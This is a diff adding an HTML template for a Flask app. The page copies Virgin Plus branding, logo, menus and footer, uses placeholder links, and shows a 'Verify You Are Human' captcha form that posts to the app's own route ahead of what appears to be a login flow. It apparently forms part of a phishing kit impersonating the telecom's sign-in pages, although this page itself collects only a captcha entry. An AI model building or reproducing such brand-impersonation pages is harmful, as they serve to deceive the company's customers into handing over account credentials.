@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Ensures the mobile device renders at actual width -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify You Are Human</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+
+<div class="site-wrapper">
+
+  <!-- RED HEADER -->
+  <header class="red-header">
+    <!-- Logo (aligned as per desktop layout) -->
+    <div class="header-left">
+      <img src="{{ url_for('static', filename='images/virgin-logo.png') }}" alt="Virgin Plus Logo" />
+    </div>
+
+    <!-- Desktop nav (FR + user icon). Hidden on mobile -->
+    <div class="desktop-nav">
+      <a href="#" class="lang-link">FR</a>
+      <a href="#" class="user-icon">&#128100;</a>
+    </div>
+
+    <!-- Hamburger (only on mobile) -->
+    <div class="hamburger" onclick="toggleMobileMenu()">
+      &#9776; <!-- The “3 lines” icon -->
+    </div>
+  </header>
+
+  <!-- MOBILE MENU (dark slide-out) -->
+  <nav class="mobile-menu" id="mobileMenu">
+    <div class="mobile-menu-header">
+      <span class="close-btn" onclick="toggleMobileMenu()">&times;</span>
+      <img src="{{ url_for('static', filename='images/virgin-logo.png') }}" alt="Virgin Plus Logo" />
+    </div>
+    <ul>
+      <li><a href="#">FRANÇAIS</a></li>
+      <li><a href="#">TOP UP PREPAID</a></li>
+      <li><a href="#">ACTIVATE PREPAID</a></li>
+      <li><a href="#">MY ACCOUNT</a></li>
+    </ul>
+  </nav>
+
+  <!-- MAIN CONTENT -->
+  <main class="login-container">
+    <div class="right-col">
+      <h1>Human Verification</h1>
+      {% if error %}
+        <p style="color: red;">{{ error }}</p>
+      {% endif %}
+      <p>Please enter the code below to verify you are human.</p>
+      <div class="captcha-box" style="font-size: 1.5rem; margin: 1rem 0;">
+        <strong>{{ captcha }}</strong>
+      </div>
+      <form method="POST" action="{{ url_for('captcha') }}">
+        <label for="captcha" class="input-label">Enter the code exactly:</label>
+        <input type="text" id="captcha" name="captcha" placeholder="e.g. ABC123" required>
+        <br><br>
+        <button type="submit" class="login-btn">Verify</button>
+      </form>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="page-footer">
+    <div class="footer-links">
+      <a href="#">Contact Us</a> |
+      <a href="#">Legal &amp; Regulatory</a> |
+      <a href="#">Track your order</a> |
+      <a href="#">Wireless Code Member Rights</a> |
+      <a href="#">Provide Feedback</a>
+    </div>
+    <div class="footer-note">
+      &copy; Virgin Plus. All rights reserved.
+    </div>
+  </footer>
+
+</div>
+
+<!-- Simple JS to toggle the mobile menu -->
+<script>
+function toggleMobileMenu() {
+  var menu = document.getElementById("mobileMenu");
+  menu.classList.toggle("open");
+}
+</script>
+
+</body>
+</html>
